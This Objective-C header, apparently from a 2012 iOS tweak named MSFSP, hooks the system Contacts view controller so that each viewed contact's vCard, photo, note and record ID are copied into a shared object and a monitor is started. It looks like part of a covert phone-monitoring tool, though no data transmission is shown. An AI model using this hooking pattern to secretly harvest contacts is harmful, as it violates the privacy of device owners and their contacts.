//
//  Contact.h
//  MSFSP
//
//  Created by Makara Khloth on 6/14/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AddressBookUI/AddressBookUI.h>
#import <AddressBook/AddressBook.h>

#import "MSFSP.h"
#import "ContactInfo.h"
#import "ABVCardRecord.h"
//#import "ABPersonPageViewController.h"
//#import "ABAbstractPersonPageViewController.h"

//HOOK(ABAbstractPersonPageViewController, viewDidAppear, void) {
//	CALL_ORIG(ABAbstractPersonPageViewController, viewDidAppear);
//	DLog (@"!!!!!!!!!!!!!!!!!!! ABAbstractPersonPageViewController  viewDidAppear !!!!!!!!!!!!!!!!!!!!! ")
//	DLog (@"viewDidLoad, displayedPerson object = %@", [self displayedPerson]);
//}
//
//HOOK(ABPersonPageViewController, loadPersonViewController, void) {
//	CALL_ORIG(ABPersonPageViewController, loadPersonViewController);
//	DLog (@"!!!!!!!!!!!!!!!!!!! ABPersonPageViewController  loadPersonViewController !!!!!!!!!!!!!!!!!!!!! ")
//	DLog (@"helper %@", [self helper])
//}
//
//HOOK(ABPersonPageViewController, viewDidLoad, void) {
//	CALL_ORIG(ABPersonPageViewController, viewDidLoad);
//	DLog (@"!!!!!!!!!!!!!!!!!!! ABPersonPageViewController  viewDidLoad !!!!!!!!!!!!!!!!!!!!! ")
//	DLog (@"viewDidLoad, displayedPerson object = %@, ", [self displayedPerson] /*[self personViewDelegate]*/);
//	DLog (@"contactPropertiesController %@", [self contactPropertiesController])
//	DLog (@"displayedPerson %@", [(ABPersonViewController *)[self contactPropertiesController] displayedPerson])
//	DLog (@"personViewDelegate %@", [(ABPersonViewController *)[self contactPropertiesController] personViewDelegate])
//	DLog (@"helper %@", [self helper])
//	DLog (@"display from helper %@", [[self helper] performSelector:@selector(displayedPerson)])
//	//	ABVCardRecord* abVcardRecord = [[ABVCardRecord alloc] initWithRecord:(void *)[self displayedPerson]];
//	//	ABRecordID recordID = ABRecordGetRecordID([self displayedPerson]);
//	//	NSString *note = (NSString *)ABRecordCopyValue([self displayedPerson], kABPersonNoteProperty);
//	//	
//	//	ContactInfo *contactInfo = [ContactInfo sharedContactInfo];
//	////	[contactInfo setMAddressBook:[self addressBook]];
//	//	[contactInfo setMDisplayedPersonVcardData:[abVcardRecord _21vCardRepresentationAsData]];
//	//	[contactInfo setMPicture:[abVcardRecord imageData]];
//	//	[contactInfo setMNote:note];
//	//	[contactInfo setMDisplayedPersonRecordID:recordID];
//	//	[contactInfo startMonitor];
//	//	
//	//	[note release];
//	//	[abVcardRecord release];
//}

HOOK(ABPersonViewController, viewDidLoad, void) {
	CALL_ORIG(ABPersonViewController, viewDidLoad);
	DLog (@"viewDidLoad, displayedPerson object = %@, delegate = %@", [self displayedPerson], [self personViewDelegate]);
	
	if ([self displayedPerson]) {
		ABVCardRecord* abVcardRecord = [[ABVCardRecord alloc] initWithRecord:(void *)[self displayedPerson]];
		ABRecordID recordID = ABRecordGetRecordID([self displayedPerson]);
		NSString *note = (NSString *)ABRecordCopyValue([self displayedPerson], kABPersonNoteProperty);
		
		ContactInfo *contactInfo = [ContactInfo sharedContactInfo];
//		[contactInfo setMAddressBook:[self addressBook]];
		[contactInfo setMDisplayedPersonVcardData:[abVcardRecord _21vCardRepresentationAsData]];
		[contactInfo setMPicture:[abVcardRecord imageData]];
		[contactInfo setMNote:note];
		[contactInfo setMDisplayedPersonRecordID:recordID];
		[contactInfo startMonitor];
		
		[note release];
		[abVcardRecord release];
	} else {
		DLog (@"display persone is null")
	}
}
 
HOOK(ABPersonViewController, dealloc, void) {
	DLog (@"dealloc *****************************");
	
	ContactInfo *contactInfo = [ContactInfo sharedContactInfo];
	[contactInfo stopMonitor];
//	[contactInfo setMAddressBook:nil];
	[contactInfo setMDisplayedPersonVcardData:nil];
	[contactInfo setMPicture:nil];
	[contactInfo setMNote:nil];
	[contactInfo setMDisplayedPersonRecordID:-1];
	
	CALL_ORIG(ABPersonViewController, dealloc);
}